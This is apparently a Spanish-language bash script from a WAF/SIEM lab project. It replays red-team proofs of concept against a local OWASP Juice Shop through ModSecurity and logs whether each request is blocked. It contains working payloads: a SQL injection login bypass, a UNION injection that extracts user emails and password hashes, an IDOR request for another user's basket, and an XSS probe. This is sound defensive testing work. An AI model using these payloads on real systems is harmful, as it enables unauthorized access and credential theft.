#!/usr/bin/env bash
# Repite los PoC del Equipo rojo (H2) por el WAF y anota hora, payload y código HTTP.
# Sirve en los dos modos:
#   DetectionOnly -> los ataques pasan (200/401) pero quedan en Kibana (DET-01..03)
#   On            -> los ataques de inyección y el método raro reciben 403
# Uso, desde waf-siem/:
#   ./scripts/poc-redteam.sh | tee ../docs/hito-3/poc-$(grep ^MODSEC_RULE_ENGINE .env | cut -d= -f2).txt
set -u

WAF_URL="${WAF_URL:-http://127.0.0.1:8080}"
MODO="$(grep -E '^MODSEC_RULE_ENGINE=' "$(dirname "$0")/../.env" 2>/dev/null | cut -d= -f2)"

# Espera a que el WAF responda (tras "docker compose up -d waf" tarda unos segundos)
for _ in $(seq 1 30); do
  c="$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 "$WAF_URL/rest/admin/application-version" || true)"
  [ "$c" = "200" ] && break; sleep 1
done

echo "=== PoC del Equipo rojo por el WAF ($WAF_URL) | modo: ${MODO:-?} ==="
echo "Fecha: $(date '+%Y-%m-%d')  (hora local GT y UTC en cada fila)"
echo

fila() { # id, metodo, ruta, payload, codigo
  printf '%s | %s UTC | %-7s | HTTP %s | %s %s | payload: %s\n' \
    "$(date '+%H:%M:%S')" "$(date -u '+%H:%M:%S')" "$1" "$5" "$2" "$3" "$4"
}

# Token propio (jim) para el IDOR
TOKEN="$(curl -s --max-time 15 -X POST "$WAF_URL/rest/user/login" \
  -H 'Content-Type: application/json' \
  --data '{"email":"jim@juice-sh.op","password":"ncc-1701"}' \
  | grep -oE '"token":"[^"]*"' | head -1 | cut -d'"' -f4)"
[ -z "$TOKEN" ] && echo "AVISO: no se obtuvo token de jim (el IDOR saldrá 401)."

# PoC-01 · SQLi en el login
P1="' OR 1=1--"
C="$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 -X POST "$WAF_URL/rest/user/login" \
  -H 'Content-Type: application/json' --data "{\"email\":\"$P1\",\"password\":\"x\"}")"
fila PoC-01 POST /rest/user/login "email=$P1" "$C"; sleep 2

# PoC-02 · UNION SQLi en la búsqueda (10 columnas)
P2="qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9','10' FROM Users--"
C="$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 -G "$WAF_URL/rest/products/search" \
  --data-urlencode "q=$P2")"
fila PoC-02 GET /rest/products/search "q=$P2" "$C"; sleep 2

# PoC-03 · IDOR: carrito 1 (admin) con el token de jim. El WAF no lo bloquea: es una petición válida.
C="$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 "$WAF_URL/rest/basket/1" \
  -H "Authorization: Bearer $TOKEN")"
fila PoC-03 GET /rest/basket/1 "token de jim, basket ajeno" "$C"; sleep 2

# Pruebas de detección (no son PoC del H2): alimentan DET-02 y DET-03
P4="<script>alert(1)</script>"
C="$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 -G "$WAF_URL/rest/products/search" \
  --data-urlencode "q=$P4")"
fila DET-02 GET /rest/products/search "q=$P4" "$C"; sleep 2

C="$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 -X PROPFIND "$WAF_URL/rest/products/search")"
fila DET-03 PROPFIND /rest/products/search "método fuera de ALLOWED_METHODS" "$C"

echo
echo "Esperado en DetectionOnly: PoC-01 200, PoC-02 200, PoC-03 200, DET-02 200, DET-03 500 (la app no conoce PROPFIND)."
echo "Esperado en On:            PoC-01 403, PoC-02 403, PoC-03 200 (lo corrige el H4), DET-02 403, DET-03 403."
